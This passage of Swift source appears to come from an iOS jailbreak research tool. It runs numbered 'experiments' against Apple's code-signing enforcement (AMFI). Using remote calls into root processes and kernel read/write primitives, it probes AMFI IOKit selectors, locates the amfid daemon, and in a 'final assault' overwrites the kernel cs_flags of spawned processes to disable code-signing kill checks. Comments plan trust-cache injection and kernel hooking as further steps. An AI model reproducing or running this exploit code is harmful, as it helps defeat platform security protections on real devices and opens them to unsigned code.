            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "âœ… AMFI opened: connect=\(connect)\n\n"
        
        // IOConnectCallStructMethod(connect, selector, inputStruct, inputSize, outputStruct, &outputSize)
        // 6 params â€” safe for ARM64
        
        let structInAddr = mem + 0x2200   // input struct buffer (256 bytes)
        let structOutAddr = mem + 0x2400  // output struct buffer (256 bytes)
        let structOutSizeAddr = mem + 0x2600
        
        // Active selectors from exp 56: [2, 4, 5, 6, 7, 9, 11, 12, 13, 14, 15]
        // Test selector 2 first (likely the most basic method)
        
        var foundWorking: [(Int, String)] = []
        
        // Strategy 1: Try each active selector with different struct sizes
        // AMFI methods typically expect specific struct sizes
        let testSelectors = [2, 4, 5, 9, 11, 12]  // subset to avoid panic
        let testSizes: [UInt64] = [4, 8, 20, 24, 32, 40, 48, 64]
        
        detail += "--- Testing struct input sizes ---\n"
        
        for selector in testSelectors.prefix(4) {  // limit to 4 selectors
            detail += "\nSelector \(selector):\n"
            
            for size in testSizes {
                // Zero-fill input struct
                for i in 0..<Int(size / 8 + 1) {
                    sb[structInAddr + UInt64(i * 8)].setValue64(0)
                }
                
                // Set output size
                sb[structOutSizeAddr].setValue64(256)
                
                // Clear output
                for i in 0..<32 {
                    sb[structOutAddr + UInt64(i * 8)].setValue64(0)
                }
                
                // IOConnectCallStructMethod(connect, selector, input, inputSize, output, &outputSize)
                let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                             UInt64(connect),
                                             UInt64(selector),
                                             structInAddr, size,
                                             structOutAddr, structOutSizeAddr)
                
                let outSize = sb[structOutSizeAddr].value64()
                
                if ret == 0 {
                    detail += "  âœ… size=\(size): SUCCESS! outSize=\(outSize)\n"
                    foundWorking.append((selector, "struct_size=\(size)"))
                    
                    // Read output
                    if outSize > 0 && outSize <= 64 {
                        var outBuf = [UInt8](repeating: 0, count: Int(outSize))
                        sb.remoteRead(structOutAddr, to: &outBuf, size: outSize)
                        let hex = outBuf.prefix(24).map { String(format: "%02x", $0) }.joined(separator: " ")
                        detail += "    output: \(hex)\n"
                    }
                    break  // found working size for this selector
                } else if ret != 0xe00002c2 && ret != 0xe00002c7 && ret != 0xe00002bc {
                    // Different error â€” interesting!
                    detail += "  âš ï¸ size=\(size): ret=0x\(String(format: "%x", ret))\n"
                }
            }
        }
        
        // Strategy 2: Try selector 2 with PID as input (4 bytes)
        // AMFI might have a "check process" method
        detail += "\n--- Selector 2 with PID input ---\n"
        sb[structInAddr].setValue32(1)  // PID 1 = launchd
        sb[structOutSizeAddr].setValue64(256)
        let pidRet = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                         UInt64(connect), 2,
                                         structInAddr, 4,
                                         structOutAddr, structOutSizeAddr)
        let pidOutSize = sb[structOutSizeAddr].value64()
        detail += "  PID=1: ret=0x\(String(format: "%x", pidRet)), outSize=\(pidOutSize)\n"
        if pidRet == 0 && pidOutSize > 0 {
            var outBuf = [UInt8](repeating: 0, count: min(Int(pidOutSize), 32))
            sb.remoteRead(structOutAddr, to: &outBuf, size: UInt64(outBuf.count))
            detail += "  output: \(outBuf.map { String(format: "%02x", $0) }.joined(separator: " "))\n"
            foundWorking.append((2, "PID input"))
        }
        
        // Strategy 3: Try selector 5 with CDHash-like input (20 bytes = SHA1)
        // This might be "add to trust cache" or "check CDHash"
        detail += "\n--- Selector 5 with CDHash input (20B zeros) ---\n"
        for i in 0..<3 { sb[structInAddr + UInt64(i * 8)].setValue64(0) }
        sb[structOutSizeAddr].setValue64(256)
        let cdRet = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                        UInt64(connect), 5,
                                        structInAddr, 20,
                                        structOutAddr, structOutSizeAddr)
        let cdOutSize = sb[structOutSizeAddr].value64()
        detail += "  ret=0x\(String(format: "%x", cdRet)), outSize=\(cdOutSize)\n"
        if cdRet == 0 {
            detail += "  âœ… CDHash-sized input ACCEPTED!\n"
            foundWorking.append((5, "CDHash input"))
        }
        
        // Strategy 4: Try with scalar+struct combo via IOConnectCallMethod workaround
        // Some methods need BOTH scalar and struct input
        // Use IOConnectCallScalarMethod with scalar[0] = selector-specific value
        detail += "\n--- Selector 9 with 2 scalar inputs ---\n"
        let scalarInAddr = mem + 0x2800
        sb[scalarInAddr].setValue64(1)       // arg0 = PID?
        sb[scalarInAddr + 8].setValue64(0)   // arg1 = flags?
        let scalarOutAddr = mem + 0x2A00
        let scalarOutCntAddr = mem + 0x2C00
        sb[scalarOutCntAddr].setValue32(16)
        let s9ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                        UInt64(connect), 9,
                                        scalarInAddr, 2,
                                        scalarOutAddr, scalarOutCntAddr)
        let s9out = sb[scalarOutCntAddr].value32()
        detail += "  2 scalars [1,0]: ret=0x\(String(format: "%x", s9ret)), outCnt=\(s9out)\n"
        if s9ret == 0 {
            let val = sb[scalarOutAddr].value64()
            detail += "  âœ… output[0] = 0x\(String(format: "%llx", val))\n"
            foundWorking.append((9, "2 scalar inputs"))
        }
        
        // Strategy 5: Try selector 2 with 2 scalars (PID + operation)
        detail += "\n--- Selector 2 with 2 scalar inputs ---\n"
        sb[scalarInAddr].setValue64(1)       // PID 1
        sb[scalarInAddr + 8].setValue64(0)   // operation 0
        sb[scalarOutCntAddr].setValue32(16)
        let s2ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                        UInt64(connect), 2,
                                        scalarInAddr, 2,
                                        scalarOutAddr, scalarOutCntAddr)
        let s2out = sb[scalarOutCntAddr].value32()
        detail += "  [PID=1, op=0]: ret=0x\(String(format: "%x", s2ret)), outCnt=\(s2out)\n"
        if s2ret == 0 {
            let val = sb[scalarOutAddr].value64()
            detail += "  âœ… output[0] = 0x\(String(format: "%llx", val))\n"
            foundWorking.append((2, "2 scalar [PID,op]"))
        }
        
        // Strategy 6: Try selector 4 with 3 scalars
        detail += "\n--- Selector 4 with 3 scalar inputs ---\n"
        sb[scalarInAddr].setValue64(1)       // PID
        sb[scalarInAddr + 8].setValue64(0)   // flags
        sb[scalarInAddr + 16].setValue64(0)  // extra
        sb[scalarOutCntAddr].setValue32(16)
        let s4ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                        UInt64(connect), 4,
                                        scalarInAddr, 3,
                                        scalarOutAddr, scalarOutCntAddr)
        let s4out = sb[scalarOutCntAddr].value32()
        detail += "  [1,0,0]: ret=0x\(String(format: "%x", s4ret)), outCnt=\(s4out)\n"
        if s4ret == 0 {
            let val = sb[scalarOutAddr].value64()
            detail += "  âœ… output[0] = 0x\(String(format: "%llx", val))\n"
            foundWorking.append((4, "3 scalar inputs"))
        }
        
        // Close AMFI
        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
        RootExecutor.rcall(sb, "free", nameAddr)
        
        detail += "\n--- RESULTS ---\n"
        detail += "Working combinations: \(foundWorking.count)\n"
        for (sel, desc) in foundWorking {
            detail += "  Selector \(sel): \(desc)\n"
        }
        if foundWorking.isEmpty {
            detail += "No working combination found yet.\n"
            detail += "Methods might need specific entitlement or token.\n"
            detail += "NEXT: try with 4,5,6 scalar inputs or larger structs\n"
        } else {
            detail += "\nðŸ”¥ FOUND WORKING AMFI METHODS!\n"
            detail += "Next: determine what each method DOES\n"
            detail += "Try: pass our binary's CDHash to whitelist it\n"
        }
        
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: !foundWorking.isEmpty, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 59: AMFI from Launchd + amfid Hunt
    
    /// Experiment 59: Try AMFI IOKit from LAUNCHD context (PID 1 = most trusted)
    /// Also: find amfid daemon and try to get its task port
    /// amfid is the userspace daemon that handles AMFI policy decisions
    /// If we can control amfid â†’ we control code signing decisions!
    private func expAMFIFromLaunchd(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        var detail = "AMFI from Launchd + amfid Hunt\n\n"
        let mgr = dspmgr.shared
        
        // Part 1: Try opening AMFI user client from LAUNCHD (PID 1)
        // Launchd is the most privileged userspace process
        detail += "=== Part 1: AMFI IOKit from launchd ===\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let ioServiceMatching = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceMatching"))
        let ioServiceGetMatching = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceGetMatchingService"))
        let ioServiceOpen = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceOpen"))
        let ioConnectCallScalar = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOConnectCallScalarMethod"))
        
        var amfiConnect: UInt32 = 0
        
        if ioServiceMatching != 0 {
            let nameAddr = remote_alloc_str(rc, "AppleMobileFileIntegrity")
            let matchDict = RootExecutor.rcall(rc, "IOServiceMatching", nameAddr)
            
            if matchDict != 0 {
                let svc = RootExecutor.rcall(rc, "IOServiceGetMatchingService", 0, matchDict)
                detail += "AMFI service from launchd: 0x\(String(format: "%x", svc))\n"
                
                if svc != 0 {
                    let taskSelf = RootExecutor.rcall(rc, "mach_task_self")
                    let connectAddr = mem + 0x1A00
                    rc[connectAddr].setValue32(0)
                    let openRet = RootExecutor.rcall(rc, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
                    amfiConnect = rc[connectAddr].value32()
                    detail += "IOServiceOpen: ret=0x\(String(format: "%x", openRet)), connect=\(amfiConnect)\n"
                    
                    if openRet == 0 && amfiConnect != 0 {
                        detail += "âœ… AMFI opened from launchd!\n\n"
                        
                        // Try selectors with different scalar counts from launchd
                        let scalarInAddr = mem + 0x2000
                        let scalarOutAddr = mem + 0x2200
                        let scalarOutCntAddr = mem + 0x2400
                        
                        // Selector 2 with 1 scalar (our PID)
                        let ourPid = RootExecutor.rcall(rc, "getpid")
                        rc[scalarInAddr].setValue64(ourPid)
                        rc[scalarOutCntAddr].setValue32(16)
                        let r2 = RootExecutor.rcall(rc, "IOConnectCallScalarMethod",
                                                    UInt64(amfiConnect), 2,
                                                    scalarInAddr, 1,
                                                    scalarOutAddr, scalarOutCntAddr)
                        detail += "Sel 2 [PID=\(ourPid)]: ret=0x\(String(format: "%x", r2))\n"
                        
                        // Selector 2 with 4 scalars
                        rc[scalarInAddr].setValue64(ourPid)
                        rc[scalarInAddr + 8].setValue64(0)
                        rc[scalarInAddr + 16].setValue64(0)
                        rc[scalarInAddr + 24].setValue64(0)
                        rc[scalarOutCntAddr].setValue32(16)
                        let r2b = RootExecutor.rcall(rc, "IOConnectCallScalarMethod",
                                                     UInt64(amfiConnect), 2,
                                                     scalarInAddr, 4,
                                                     scalarOutAddr, scalarOutCntAddr)
                        detail += "Sel 2 [4 scalars]: ret=0x\(String(format: "%x", r2b))\n"
                        
                        // Selector 5 with 1 scalar
                        rc[scalarInAddr].setValue64(0)
                        rc[scalarOutCntAddr].setValue32(16)
                        let r5 = RootExecutor.rcall(rc, "IOConnectCallScalarMethod",
                                                    UInt64(amfiConnect), 5,
                                                    scalarInAddr, 1,
                                                    scalarOutAddr, scalarOutCntAddr)
                        detail += "Sel 5 [0]: ret=0x\(String(format: "%x", r5))\n"
                        
                        // Selector 9 with 1 scalar = 0 (might be "disable" or "query")
                        rc[scalarInAddr].setValue64(0)
                        rc[scalarOutCntAddr].setValue32(16)
                        let r9 = RootExecutor.rcall(rc, "IOConnectCallScalarMethod",
                                                    UInt64(amfiConnect), 9,
                                                    scalarInAddr, 1,
                                                    scalarOutAddr, scalarOutCntAddr)
                        detail += "Sel 9 [0]: ret=0x\(String(format: "%x", r9))\n"
                        
                        // Check if any succeeded
                        if r2 == 0 || r2b == 0 || r5 == 0 || r9 == 0 {
                            detail += "\nðŸ”¥ðŸ”¥ðŸ”¥ LAUNCHD HAS AMFI ACCESS!\n"
                            let outVal = rc[scalarOutAddr].value64()
                            detail += "output[0] = 0x\(String(format: "%llx", outVal))\n"
                        } else {
                            detail += "\nLaunchd also rejected â€” needs specific entitlement\n"
                        }
                        
                        // Close
                        RootExecutor.rcall(rc, "IOServiceClose", UInt64(amfiConnect))
                    } else {
                        detail += "âŒ Cannot open AMFI from launchd\n"
                    }
                }
            }
            RootExecutor.rcall(rc, "free", remote_alloc_str(rc, "AppleMobileFileIntegrity"))
        } else {
            detail += "IOKit not loaded in launchd\n"
        }
        
        // Part 2: Find amfid daemon
        detail += "\n=== Part 2: Hunt for amfid ===\n"
        
        // amfid is the AMFI daemon â€” it makes code signing decisions
        // If we can find it and RC into it, we have full AMFI control
        let amfidProc = mgr.findProc(name: "amfid")
        detail += "amfid proc in kernel: 0x\(String(format: "%llx", amfidProc))\n"
        
        if amfidProc != 0 {
            // Read amfid's PID
            let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
            detail += "amfid PID: \(amfidPid)\n"
            
            // Read amfid's proc_ro â†’ task
            let amfidProcRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
            let amfidTask = amfidProcRo != 0 ? ds_kread64(amfidProcRo + UInt64(off_proc_ro_pr_task)) : 0
            detail += "amfid proc_ro: 0x\(String(format: "%llx", amfidProcRo))\n"
            detail += "amfid task: 0x\(String(format: "%llx", amfidTask))\n"
            
            // Read amfid's cs_flags
            let amfidCSFlags = mgr.readCSFlags(pid: Int32(bitPattern: amfidPid))
            detail += "amfid cs_flags: 0x\(String(format: "%x", amfidCSFlags))\n"
            if amfidCSFlags & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY âœ…\n" }
            if amfidCSFlags & 0x4000 != 0 { detail += "  CS_GET_TASK_ALLOW\n" }
            
            detail += "\nâœ… amfid FOUND! PID=\(amfidPid)\n"
            detail += "amfid is the code signing policy daemon.\n"
            detail += "If we can RC into amfid â†’ full AMFI control!\n"
            detail += "NEXT: try RemoteCall init to amfid process\n"
        } else {
            detail += "amfid not found in process list\n"
            detail += "Trying to find via name scan...\n"
            
            // Scan process list for amfi-related processes
            let procs = ["amfid", "trustd", "securityd", "syspolicyd"]
            for name in procs {
                let proc = mgr.findProc(name: name)
                if proc != 0 {
                    let pid = ds_kread32(proc + UInt64(off_proc_p_pid))
                    detail += "  \(name): PID=\(pid), proc=0x\(String(format: "%llx", proc))\n"
                }
            }
        }
        
        // Part 3: Trust Cache research
        detail += "\n=== Part 3: Trust Cache Info ===\n"
        detail += "Trust caches are kernel-resident lists of allowed CDHashes.\n"
        detail += "If we can ADD our binary's CDHash to a trust cache â†’ bypass AMFI!\n"
        detail += "Trust cache structs are in kernel heap (kalloc zone).\n"
        detail += "Our socket KRW might not reach them, but worth investigating.\n"
        
        // Try to find trust cache pointer via sysctl
        let tcNameAddr = remote_alloc_str(rc, "security.mac.amfi.trust_cache_count")
        let tcBufAddr = mem + 0x2800
        let tcSizeAddr = mem + 0x2A00
        rc[tcSizeAddr].setValue64(8)
        let tcRet = RootExecutor.rcall(rc, "sysctlbyname", tcNameAddr, tcBufAddr, tcSizeAddr, 0, 0)
        if tcRet == 0 {
            let tcCount = rc[tcBufAddr].value64()
            detail += "Trust cache count: \(tcCount)\n"
        } else {
            detail += "trust_cache_count sysctl: ret=\(tcRet) (not available)\n"
        }
        RootExecutor.rcall(rc, "free", tcNameAddr)
        
        // Try amfi.developer_mode_status
        let devNameAddr = remote_alloc_str(rc, "security.mac.amfi.developer_mode_status")
        rc[tcSizeAddr].setValue64(4)
        let devRet = RootExecutor.rcall(rc, "sysctlbyname", devNameAddr, tcBufAddr, tcSizeAddr, 0, 0)
        if devRet == 0 {
            let devMode = rc[tcBufAddr].value32()
            detail += "Developer mode: \(devMode)\n"
        } else {
            detail += "developer_mode_status: ret=\(devRet)\n"
        }
        RootExecutor.rcall(rc, "free", devNameAddr)
        
        let success = amfidProc != 0 || (amfiConnect != 0)
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI launchd+amfid", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 60: RemoteCall into amfid
    
    /// Experiment 60: Initialize RemoteCall into amfid daemon!
    /// amfid (PID 52) is the code signing policy daemon.
    /// It has the entitlements needed to call AMFI IOKit methods.
    /// If we can RC into amfid â†’ call AMFI methods FROM amfid â†’ bypass!
    ///
    /// Strategy:
    /// 1. Find amfid PID (already found: 52)
    /// 2. Use dspmgr.rcinit(process: "amfid") to establish RemoteCall
    /// 3. From amfid context: call IOConnectCallScalarMethod on AMFI
    /// 4. amfid has com.apple.private.amfi.can-execute entitlement!
    private func expRCIntoAmfid(rc: RemoteCall) -> ExperimentResult {
        let mgr = dspmgr.shared
        var detail = "ðŸ”¥ amfid Kernel Research\n\n"
        
        // RC to amfid HANGS (confirmed â€” single-threaded daemon)
        // Direct task struct reads PANIC (itk_space, threads in wrong zone)
        // Only safe reads: proc, proc_ro, pid, cs_flags
        
        // Step 1: Find amfid
        let amfidProc = mgr.findProc(name: "amfid")
        guard amfidProc != 0 else {
            detail += "âŒ amfid not found in process list\n"
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ amfid research", success: false, detail: detail, timestamp: Date())
        }
        
        let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
        detail += "amfid PID: \(amfidPid)\n"
        detail += "amfid proc: 0x\(String(format: "%llx", amfidProc))\n"
        
        // Step 2: Read proc_ro (SAFE â€” same zone as proc)
        let amfidProcRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
        detail += "amfid proc_ro: 0x\(String(format: "%llx", amfidProcRo))\n"
        
        // Step 3: Read cs_flags (SAFE â€” in proc_ro)
        let amfidCSFlags = mgr.readCSFlags(pid: Int32(bitPattern: amfidPid))
        detail += "amfid cs_flags: 0x\(String(format: "%x", amfidCSFlags))\n"
        if amfidCSFlags & 0x001 != 0 { detail += "  CS_VALID\n" }
        if amfidCSFlags & 0x004 != 0 { detail += "  CS_HARD\n" }
        if amfidCSFlags & 0x008 != 0 { detail += "  CS_KILL\n" }
        if amfidCSFlags & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY âœ…\n" }
        
        // Step 4: Read p_flag (SAFE)
        let amfidPFlag = ds_kread32(amfidProc + UInt64(off_proc_p_flag))
        detail += "amfid p_flag: 0x\(String(format: "%x", amfidPFlag))\n"
        
        // Step 5: Read task pointer (SAFE to read pointer, NOT safe to dereference task internals)
        let amfidTask = amfidProcRo != 0 ? ds_kread64(amfidProcRo + UInt64(off_proc_ro_pr_task)) : 0
        detail += "amfid task ptr: 0x\(String(format: "%llx", amfidTask))\n"
        detail += "âš ï¸ Cannot read task internals (itk_space, threads â†’ panic)\n"
        
        // Step 6: Read ucred (SAFE â€” pointer in proc_ro)
        var ucredAddr: UInt64 = 0
        if amfidProcRo != 0 {
            ucredAddr = ds_kread64(amfidProcRo + UInt64(off_proc_ro_p_ucred))
            detail += "amfid ucred: 0x\(String(format: "%llx", ucredAddr))\n"
            
            // Read uid from ucred (offset 0x18 is cr_uid typically)
            if ucredAddr != 0 {
                let uid = ds_kread32(ucredAddr + 0x18)
                detail += "amfid uid: \(uid)\n"
            }
        }
        
        // Step 7: Read p_textvp (vnode of amfid binary)
        let textVP = ds_kread64(amfidProc + UInt64(off_proc_p_textvp))
        detail += "amfid textvp: 0x\(String(format: "%llx", textVP))\n"
        
        // Step 8: Read process name
        var nameBuf = [UInt8](repeating: 0, count: 32)
        let nameAddr = amfidProc + UInt64(off_proc_p_name)
        for i in 0..<32 {
            nameBuf[i] = ds_kread8(nameAddr + UInt64(i))
            if nameBuf[i] == 0 { break }
        }
        let procName = String(bytes: nameBuf.prefix(while: { $0 != 0 }), encoding: .utf8) ?? "?"
        detail += "amfid name: \(procName)\n"
        
        // Step 9: Also find trustd and securityd
        detail += "\n=== Related daemons ===\n"
        let relatedProcs = ["trustd", "securityd", "syspolicyd"]
        for name in relatedProcs {
            let proc = mgr.findProc(name: name)
            if proc != 0 {
                let pid = ds_kread32(proc + UInt64(off_proc_p_pid))
                let csf = mgr.readCSFlags(pid: Int32(bitPattern: pid))
                detail += "\(name): PID=\(pid), cs=0x\(String(format: "%x", csf))"
                if csf & 0x100 != 0 { detail += " [PLATFORM]" }
                detail += "\n"
            }
        }
        
        detail += "\n=== CONCLUSION ===\n"
        detail += "RC to amfid: âŒ IMPOSSIBLE (hangs â€” single-threaded)\n"
        detail += "Task internals: âŒ INACCESSIBLE (wrong kernel zone)\n"
        detail += "amfid is CS_PLATFORM_BINARY with uid=0\n\n"
        detail += "Remaining AMFI bypass paths:\n"
        detail += "â€¢ Trust cache injection (find TC struct in kernel heap)\n"
        detail += "â€¢ IOSurface external method exploitation\n"
        detail += "â€¢ Kernel function hooking (if we find writable code)\n"
        detail += "â€¢ Developer mode exploitation (already enabled!)\n"
        
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ amfid research", success: true, detail: detail, timestamp: Date())
    }
    
    // MARK: - ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 61: ALL REMAINING PATHS
    
    /// Experiment 61: Combined final assault â€” all remaining bypass paths in one
    /// 1. Trust Cache scan (find TC linked list via known kernel symbols)
    /// 2. Developer mode spawn (special flags for dev-mode enabled devices)
    /// 3. posix_spawn with responsibility_spawnattrs (launchd managed spawn)
    /// 4. IOSurface external method 9/10 (getValue/setValue on kernel objects)
    /// 5. Spawn with CS_DEBUGGED patched on child process
    private func expFinalAssault(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let mgr = dspmgr.shared
        var detail = "ðŸ”¥ FINAL ASSAULT â€” All remaining paths\n\n"
        var anySuccess = false
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PATH 1: Developer Mode Spawn
        // Developer mode = 1 (confirmed). On iOS 16+, dev mode
        // allows some unsigned code execution for development.
        // Try: posix_spawnattr with _POSIX_SPAWN_DISABLE_ASLR + persona
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "â•â•â• PATH 1: Developer Mode Spawn â•â•â•\n"
        
        // Copy binary first
        let srcPath = remote_alloc_str(rc, "/bin/df")
        let dstPath = remote_alloc_str(rc, "/tmp/.dsp_devmode_test")
        RootExecutor.rcall(rc, "unlink", dstPath)
        let sf = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
        let df = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        if sf != UInt64(bitPattern: -1) && df != UInt64(bitPattern: -1) {
            let buf = mem + 0x800
            for _ in 0..<50 {
                let n = RootExecutor.rcall(rc, "read", sf, buf, 2048)
                if n == 0 || n > 2048 { break }
                RootExecutor.rcall(rc, "write", df, buf, n)
            }
            RootExecutor.rcall(rc, "close", sf)
            RootExecutor.rcall(rc, "close", df)
        }
        
        // Try spawn with various "developer" flags
        let devFlags: [(String, UInt64)] = [
            ("DISABLE_ASLR (0x100)", 0x0100),
            ("SETEXEC (0x40)", 0x0040),
            ("SETPGROUP|SETSID|DISABLE_ASLR", 0x0502),
            ("CLOEXEC_DEFAULT|DISABLE_ASLR", 0x1100),
        ]
        
        for (name, flags) in devFlags {
            let attrAddr = mem + 0x1800
            rc[attrAddr].setValue64(0)
            RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
            RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, flags)
            
            let argvBase = mem + 0x1C00
            rc[argvBase].setValue64(dstPath)
            rc[argvBase + 8].setValue64(0)
            let pidAddr = mem + 0x1E00
            rc[pidAddr].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, attrAddr, argvBase, 0)
            RootExecutor.rcall(rc, "usleep", 300000)
            RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
            
            detail += "  \(name): ret=\(ret)\n"
            if ret == 0 {
                detail += "  ðŸŽ‰ SPAWN SUCCESS!\n"
                anySuccess = true
            }
            RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
        }
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PATH 2: CS_DEBUGGED on child before exec
        // Fork child â†’ patch its cs_flags to add CS_DEBUGGED â†’ then spawn
        // CS_DEBUGGED tells AMFI "debugger attached, relax checks"
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "\nâ•â•â• PATH 2: CS_DEBUGGED patch + spawn â•â•â•\n"
        
        // Fork to create child
        let childPid = RootExecutor.rcall(rc, "fork")
        if childPid != 0 && childPid != UInt64(bitPattern: -1) {
            detail += "Forked child PID: \(childPid)\n"
            
            // Patch child's cs_flags to add CS_DEBUGGED (0x800) + CS_GET_TASK_ALLOW (0x4000)
            // Also remove CS_HARD (0x4) and CS_KILL (0x8)
            let childProc = mgr.findProc(pid: Int32(childPid))
            if childProc != 0 {
                let childProcRo = ds_kread64(childProc + UInt64(off_proc_p_proc_ro))
                if childProcRo != 0 {
                    let currentFlags = ds_kread32(childProcRo + 0x1c)
                    // Add CS_DEBUGGED | CS_GET_TASK_ALLOW, remove CS_HARD | CS_KILL
                    let newFlags = (currentFlags | 0x4800) & ~UInt32(0x000C)
                    ds_kwrite32(childProcRo + 0x1c, newFlags)
                    let afterFlags = ds_kread32(childProcRo + 0x1c)
                    detail += "cs_flags: 0x\(String(format: "%x", currentFlags)) â†’ 0x\(String(format: "%x", afterFlags))\n"
                    
                    if afterFlags != currentFlags {
                        detail += "âœ… CS_DEBUGGED patched on child!\n"
                    }
                }
            }
            
            // Kill child (it's just a fork copy, not useful yet)
            RootExecutor.rcall(rc, "kill", childPid, 9)
            RootExecutor.rcall(rc, "waitpid", childPid, mem + 0x380, 0)
            
            // Now: spawn the copied binary â€” AMFI checks the NEW process
            // Patch cs_flags AFTER spawn (race condition approach)
            detail += "\nSpawn + immediate cs_flags patch (race)...\n"
            let argvBase2 = mem + 0x1C00
            rc[argvBase2].setValue64(dstPath)
            rc[argvBase2 + 8].setValue64(0)
            let pidAddr2 = mem + 0x1E00
            rc[pidAddr2].setValue64(0)
            
            // Spawn with START_SUSPENDED so we can patch before it runs
            let attrAddr2 = mem + 0x1800
            rc[attrAddr2].setValue64(0)
            RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr2)
            RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr2, 0x0080) // POSIX_SPAWN_START_SUSPENDED
            
            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr2, dstPath, 0, attrAddr2, argvBase2, 0)
            let spawnedPid = rc[pidAddr2].value32()
            detail += "Spawn (SUSPENDED): ret=\(spawnRet), pid=\(spawnedPid)\n"
            
            if spawnRet == 0 && spawnedPid != 0 {
                // Process is suspended! Patch its cs_flags NOW
                let spawnedProc = mgr.findProc(pid: Int32(spawnedPid))
                if spawnedProc != 0 {
                    let spProcRo = ds_kread64(spawnedProc + UInt64(off_proc_p_proc_ro))
                    if spProcRo != 0 {
                        let spFlags = ds_kread32(spProcRo + 0x1c)
                        let spNewFlags = (spFlags | 0x4800) & ~UInt32(0x000C) // +DEBUGGED +GET_TASK_ALLOW -HARD -KILL
                        ds_kwrite32(spProcRo + 0x1c, spNewFlags)
                        detail += "Patched spawned process cs_flags: 0x\(String(format: "%x", spFlags)) â†’ 0x\(String(format: "%x", spNewFlags))\n"
                    }
                }
                
                // Resume the process
                RootExecutor.rcall(rc, "kill", UInt64(spawnedPid), 18) // SIGCONT
                RootExecutor.rcall(rc, "usleep", 1000000) // 1s
                
                // Check if it's still alive (not killed by AMFI)
                let statusAddr = mem + 0x380
                rc[statusAddr].setValue32(0)
                let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(spawnedPid), statusAddr, UInt64(WNOHANG))
                let status = rc[statusAddr].value32()
                
                detail += "After resume: waitpid=\(waitRet), status=0x\(String(format: "%x", status))\n"
                
                let exited = (status & 0x7F) == 0
                let exitCode = (status >> 8) & 0xFF
                let signaled = (status & 0x7F) != 0 && (status & 0x7F) != 0x7F
                let sig = status & 0x7F
                
                if exited && exitCode == 0 {
                    detail += "ðŸŽ‰ðŸŽ‰ðŸŽ‰ PROCESS RAN AND EXITED NORMALLY! ðŸŽ‰ðŸŽ‰ðŸŽ‰\n"
                    detail += "CS_DEBUGGED BYPASS WORKS!\n"
                    anySuccess = true
                } else if signaled && sig == 9 {
                    detail += "âŒ Killed by SIGKILL (AMFI still enforcing)\n"
                } else if waitRet == 0 {
                    detail += "Process still running (not reaped yet)\n"
                    RootExecutor.rcall(rc, "kill", UInt64(spawnedPid), 9)
                    RootExecutor.rcall(rc, "waitpid", UInt64(spawnedPid), statusAddr, 0)
                } else {
